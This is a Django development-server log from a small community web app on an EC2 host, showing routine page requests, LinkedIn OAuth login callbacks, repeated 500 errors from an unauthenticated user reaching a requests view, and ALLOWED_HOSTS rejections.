[09/Dec/2018 08:27:29] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 08:27:31] "GET /community/4 HTTP/1.1" 301 0
[09/Dec/2018 08:27:32] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:27:34] "GET /community/4/join HTTP/1.1" 200 6336
[09/Dec/2018 08:27:49] "POST /community/4/join HTTP/1.1" 200 4767
[09/Dec/2018 08:27:52] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:27:53] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:27:56] "GET /profile/4/mycommunities HTTP/1.1" 200 5614
[09/Dec/2018 08:27:57] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5064
[09/Dec/2018 08:28:01] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:28:01] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:28:06] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:28:07] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:28:26] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:28:50] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:28:51] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 08:28:51] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:28:58] "GET /profile/5 HTTP/1.1" 200 17412
[09/Dec/2018 08:29:15] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:29:16] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:29:19] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 08:29:25] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:29:26] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:29:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[09/Dec/2018 08:31:43] "GET /logout HTTP/1.1" 302 0
[09/Dec/2018 08:31:44] "GET /login/ HTTP/1.1" 200 2576
Not Found: /login/logo.jpeg
[09/Dec/2018 08:31:45] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[09/Dec/2018 08:31:46] "GET /media/media/favicon.ico HTTP/1.1" 304 0
[09/Dec/2018 08:31:48] "GET / HTTP/1.1" 200 12871
[09/Dec/2018 08:31:49] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:34:05] "GET / HTTP/1.1" 200 12871
[09/Dec/2018 08:34:05] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:34:05] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:34:05] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 08:34:15] "GET /creategroup HTTP/1.1" 301 0
[09/Dec/2018 08:34:15] "GET /creategroup/ HTTP/1.1" 302 0
[09/Dec/2018 08:34:15] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 08:34:16] "GET /accounts/login/?next=/creategroup/ HTTP/1.1" 200 2576
[09/Dec/2018 08:34:17] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /accounts/login/logo.jpeg
[09/Dec/2018 08:34:18] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6003
Not Found: /accounts/media/media/favicon.ico
[09/Dec/2018 08:34:18] "GET /accounts/media/media/favicon.ico HTTP/1.1" 404 6027
[09/Dec/2018 08:34:20] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 08:34:22] "GET /oauth/complete/linkedin-oauth2/?code=AQRdOjFII62cN1-DlJ2oldekW8MKbs5_GDGV-P8VmGaZ35D61tRGh2i07eX2VCU4nJIpW4dmKkRm9N6f0Qy6LVH64gCNVb--IJo2vMaUWEkigjzpJFw1BrDWTqOHNlMDoVi7ZCcNmvjzVLepRbrJhnlVs1Sb1e8aVVTF5FrSYkgcms4TZGkkQmtSjVJfAg&state=hxls40daLlJosGZ26IzmDZtoFPS6gMuI HTTP/1.1" 302 0
[09/Dec/2018 08:34:23] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:34:24] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:34:26] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 08:34:40] "GET /oauth/complete/linkedin-oauth2/?code=AQSXa71BnUzgup4IJDgEKOS2i5Jteaw_JLErNogqjNMs4v1nbC2gGdnmlHhQun3mRMENHgMsxq8hG0TByl7ozaygnQ0Sf1VPpN8LGqWB2L8ZgpxwzqvRzJMUpKnhI6MJ1lGu9AA9mkpp9D1XH5ByV_9z4wU2-bVFcSaov86uVLdjxrwve7IlFq0Ud2bqsw&state=LlhHZxxSR0etNAegX88bMptrsVWYk9TH HTTP/1.1" 302 0
[09/Dec/2018 08:34:41] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:34:42] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:34:42] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:34:42] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 08:34:45] "GET /creategroup/ HTTP/1.1" 200 8044
[09/Dec/2018 08:34:46] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:34:47] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:39:20] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 08:40:04] "GET /profile/5/mycommunities HTTP/1.1" 200 5650
[09/Dec/2018 08:40:05] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:40:07] "GET /requests HTTP/1.1" 200 5469
[09/Dec/2018 08:40:07] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:40:10] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:40:11] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:40:11] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:40:14] "GET /community/4/members_list HTTP/1.1" 200 5608
[09/Dec/2018 08:40:17] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:40:18] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:40:23] "GET /community/4/members_list HTTP/1.1" 200 5608
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:40:27] "GET /requests HTTP/1.1" 500 100202
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:40:30] "GET /requests HTTP/1.1" 500 100202
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:40:33] "GET /requests HTTP/1.1" 500 100202
[09/Dec/2018 08:41:45] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:41:46] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:42:06] "GET /?data=&_=1544344906687 HTTP/1.1" 200 516
[09/Dec/2018 08:42:07] "GET /?data=&_=1544344906688 HTTP/1.1" 200 516
[09/Dec/2018 08:42:12] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:42:13] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:42:15] "GET /?data=&_=1544344933512 HTTP/1.1" 200 516
[09/Dec/2018 08:42:31] "GET /?data=&_=1544344933513 HTTP/1.1" 200 516
[09/Dec/2018 08:42:47] "GET /?data=&_=1544344933514 HTTP/1.1" 200 516
[09/Dec/2018 08:43:32] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:43:32] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 08:43:34] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:43:35] "GET /profile/5 HTTP/1.1" 200 17412
[09/Dec/2018 08:43:50] "GET /?data=&_=1544345022746 HTTP/1.1" 200 516
[09/Dec/2018 08:44:24] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:44:25] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:44:26] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 08:44:50] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:44:51] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 08:44:51] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 08:44:51] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[09/Dec/2018 08:45:00] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 08:45:00] "GET / HTTP/1.1" 200 13580
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:45:12] "GET /requests HTTP/1.1" 500 101137
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:52:27] "GET /requests HTTP/1.1" 500 101137
[09/Dec/2018 08:52:31] "GET /requests HTTP/1.1" 200 5469
Internal Server Error: /requests
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 266, in requests
    admins_communities = Admins.objects.all().filter(admin_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1198, in build_filter
    self.check_related_objects(join_info.final_field, value, join_info.opts)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1065, in check_related_objects
    for v in value:
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 214, in inner
    return func(self._wrapped, *args)
TypeError: 'AnonymousUser' object is not iterable
[09/Dec/2018 08:52:45] "GET /requests HTTP/1.1" 500 100068
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[09/Dec/2018 08:52:45] "GET /requests HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('171.79.48.137', 38131)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[09/Dec/2018 08:52:54] "GET /requests HTTP/1.1" 200 6920
[09/Dec/2018 08:52:55] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:52:56] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 08:53:00] "GET /requests HTTP/1.1" 200 6920
[09/Dec/2018 08:53:01] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:04:18] "GET /requests HTTP/1.1" 200 6932
[09/Dec/2018 09:04:28] "GET /requests/4/user_response/4 HTTP/1.1" 200 5558
[09/Dec/2018 09:07:32] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 09:07:33] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:07:33] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:07:33] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:07:35] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 09:07:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:07:36] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:07:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:07:38] "GET /community/4/join HTTP/1.1" 200 6336
[09/Dec/2018 09:07:38] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:07:39] "GET /media/media/logo.png HTTP/1.1" 304 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 09:07:53] "GET / HTTP/1.0" 400 62418
[09/Dec/2018 09:20:00] "POST /community/4/join HTTP/1.1" 200 4767
[09/Dec/2018 09:20:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:20:03] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 09:20:04] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 09:20:05] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:20:05] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:20:05] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:20:09] "GET /community/3/ HTTP/1.1" 200 10378
[09/Dec/2018 09:20:09] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:20:09] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:20:10] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 09:21:50] "GET / HTTP/1.1" 400 62524
[09/Dec/2018 09:38:24] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 09:38:24] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 09:38:25] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:38:25] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:38:25] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:38:28] "GET /community/4/ HTTP/1.1" 200 10256
[09/Dec/2018 09:38:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:38:29] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:38:29] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:38:36] "GET /profile/5 HTTP/1.1" 200 17412
[09/Dec/2018 09:38:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:38:37] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:39:03] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 09:39:03] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 09:39:04] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:39:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:39:04] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:39:12] "GET /?data=&_=1544348343484 HTTP/1.1" 200 516
[09/Dec/2018 09:39:16] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 09:39:17] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 09:39:17] "GET /media/media/logo.png HTTP/1.1" 304 0
[09/Dec/2018 09:39:17] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 09:39:18] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 09:39:26] "GET /?data=&_=1544348356208 HTTP/1.1" 200 516
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 09:55:29] "GET / HTTP/1.1" 400 62406
[09/Dec/2018 10:03:31] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 10:03:31] "GET / HTTP/1.1" 200 13580
[09/Dec/2018 10:03:32] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 10:03:32] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 11:09:01] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /
[09/Dec/2018 11:48:27] "GET / HTTP/1.1" 400 62406
[09/Dec/2018 11:48:27] "GET / HTTP/1.1" 400 62412
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 11:54:00] "GET / HTTP/1.1" 400 62405
